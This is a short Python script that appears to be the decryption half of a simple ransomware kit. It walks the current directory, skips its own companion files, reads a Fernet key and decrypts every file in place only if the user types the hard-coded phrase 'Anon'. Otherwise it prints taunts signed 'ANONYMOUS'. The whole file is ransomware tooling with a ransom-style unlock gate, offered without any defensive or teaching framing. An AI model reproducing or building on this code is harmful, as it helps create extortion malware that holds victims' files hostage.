#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
#find files in directory


files = []

for file in os.listdir():
	if file == "Error.py" or file == "Key.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("Key.key", "rb") as key:
	secretkey = key.read()

secretphrase = "Anon"

user_phrase = input("Enter the Phrase:\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("You're files are decrypted now remeber we are always watching.")
else:
	print("Stilled PWNED by ANONYMOUS")
